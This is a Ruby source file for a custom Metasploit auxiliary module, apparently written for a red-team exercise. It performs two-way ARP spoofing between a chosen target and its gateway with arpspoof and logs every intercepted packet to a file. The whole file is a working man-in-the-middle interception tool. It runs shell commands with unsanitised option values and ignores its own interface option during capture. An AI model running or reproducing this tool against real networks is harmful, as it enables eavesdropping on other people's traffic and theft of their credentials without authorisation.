require 'msf/core'  # Load Metasploit core library
require 'pcap'      # Load pcap library for packet capturing

# Define the Metasploit module
class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::AutoReconnect  # Allow auto-reconnect functionality

    # Initialization of the module with its metadata
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Custom ARP Spoofing Module',  # Name of the module
            'Description'    => 'This module performs ARP spoofing and logs traffic.',  # Brief description
            'Author'         => ['Lee Rubin - Bravo Team'],  # Author of the module
            'License'        => MSF_LICENSE  # License type
        ))

        # Register options that the user must provide
        register_options([
            OptAddress.new('TARGET', [true, 'The target IP address']),  # Target IP for spoofing
            OptAddress.new('GATEWAY', [true, 'The gateway IP address']),  # Gateway IP for spoofing
            OptString.new('LOG_FILE', [false, 'File to log intercepted traffic', 'intercepted_traffic.log']),  # Log file name
            OptString.new('INTERFACE', [true, 'Network interface to use', 'ens3'])  # Updated to ens3
        ])
    end

    # Main run method that executes when the module is run
    def run
        target_ip = datastore['TARGET']  # Get target IP from datastore
        gateway_ip = datastore['GATEWAY']  # Get gateway IP from datastore
        log_file = datastore['LOG_FILE']  # Get log file name from datastore
        interface = datastore['INTERFACE']  # Get the network interface

        print_status("Starting ARP spoofing to target: #{target_ip} and gateway: #{gateway_ip}")

        begin
            # Start ARP Spoofing
            arp_spoof(target_ip, gateway_ip, interface)  # Pass the interface
            print_status("ARP spoofing initiated. Press Ctrl+C to stop.")

            # Start capturing traffic
            capture_traffic(log_file)
        rescue Interrupt
            # Handle interrupt (Ctrl+C)
            print_status("Stopping ARP spoofing...")
            stop_arp_spoofing  # Call method to stop ARP spoofing
            print_status("ARP spoofing stopped.")
        end
    end

    # Method to perform ARP Spoofing
    def arp_spoof(target_ip, gateway_ip, interface)
        # Run the arpspoof command to send spoofed ARP packets to the target
        result = `arpspoof -i #{interface} -t #{target_ip} #{gateway_ip} &`
        puts "Error starting arpspoof to target: #{result}" unless $?.success?

        # Run the arpspoof command to send spoofed ARP packets to the gateway
        result = `arpspoof -i #{interface} -t #{gateway_ip} #{target_ip} &`
        puts "Error starting arpspoof to gateway: #{result}" unless $?.success?
    end

    # Method to stop the ARP spoofing processes
    def stop_arp_spoofing
        # Kill all arpspoof processes
        `killall arpspoof`
    end

    # Method to capture traffic using pcap
    def capture_traffic(log_file)
        # Open a live capture on the specified network interface (ens3)
        Pcap::Capture.open_live('ens3', 65535, true, 0) do |capture|
            # Loop to capture packets continuously
            capture.loop do |packet|
                # Open the log file in append mode
                File.open(log_file, 'a') do |file|
                    file.puts(packet.to_s)  # Log the captured packet
                end
                # Print a status message for each captured packet
                print_status("Packet captured: #{packet.to_s}")
            end
        end
    end
end